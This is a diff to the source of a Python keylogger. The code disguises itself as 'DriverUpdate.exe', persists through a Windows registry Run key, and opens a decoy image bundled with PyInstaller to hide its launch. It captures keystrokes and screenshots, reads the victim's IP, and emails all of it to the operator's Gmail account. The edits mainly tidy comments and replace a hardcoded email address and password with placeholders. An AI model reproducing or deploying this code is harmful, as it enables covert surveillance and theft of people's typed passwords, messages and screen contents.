@@ -30,19 +30,16 @@ class Keylogger:
         file_loc = os.environ["appdata"] + "\\DriverUpdate.exe"
         if not os.path.exists(file_loc):
             shutil.copyfile(sys.executable, file_loc)
-            subprocess.call('reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DriversUpdate /t REG_SZ /d "'
-                           + file_loc + '"', shell=True)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v DriversUpdate /t REG_SZ /d "' + file_loc + '"', shell=True)
 
     def check_file(self):
         file_loc1 = os.environ["appdata"]
         output = os.getcwd()
         if str(output) != str(file_loc1):
             # This two lines
-            file_name = sys._MEIPASS + "/tree.jpg"   # this "bike.jpg" is the file name used in pyinstaller to create the .exe file
-            # as this file is created into a image file of a bike named "bike.jpg"
+            file_name = sys._MEIPASS + "/image.jpg"   # this "image.jpg" is the file name used in pyinstaller to create the .exe file.
+            # as this file is created into a image file named "image.jpg"
             subprocess.Popen(file_name, shell=True)
-            # Above two line opens the file stored in the second place
-            # If you are not using pyinstaller, erase those two lines
         self.persistance()
  
     # This function appends all the keys to make it a whole word/sentence
@@ -61,14 +58,15 @@ class Keylogger:
 
         self.append_to_log(current_key)
 
-    # This function captures screenshot and stores them as "screenshot.png"
+    # This function captures screenshot and stores them as "image.png"
     # and after that using send_email function it sends the picture via mail
     def screenshot(self):
         image = ImageGrab.grab(bbox=(0,0,1500,1000))
         image.save('image.png')
         self.send_image('image.png')
         os.remove("image.png")
-
+        
+    # This function creates email of screenshot and send it via send_mail function 
     def send_image(self, attach):
 
         msg = MIMEMultipart()
@@ -83,7 +81,8 @@ class Keylogger:
         msg.attach(part)
 
         self.send_mail(self.email, self.password, msg.as_string())
-
+        
+    # This function adds the IP of device in every email sent
     def ip_check(self):
         url = "http://checkip.dyndns.org"
         request = urllib.urlopen(url).read()
@@ -114,7 +113,7 @@ class Keylogger:
         server.sendmail(email, email, message)
         server.quit()
 
-    # This function starts the keylogger and starts functions in correct order
+    # This function starts the keylogger and starts all of the functions in correct order
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
         with keyboard_listener:
@@ -122,9 +121,10 @@ class Keylogger:
             keyboard_listener.join()
 
 # Here we call function and provide all the parameters that are time interval, email, password.
-# if you are using it provide your email , password below
+# Add your own email, password and time interval(in seconds) between emails here
 
-my_keylogger = Keylogger(20, "multitalonted@gmail.com", "Hackerkimkc")    # Parameters order :- time, "email", "password"
+my_keylogger = Keylogger('time interval you want(in seconds)', "Your gmail id", "Your password")    # Parameters order :- time, "email", "password"
+                          # Time interval(in seconds) is without inverted commas
 
 # starts the keylogger class
 
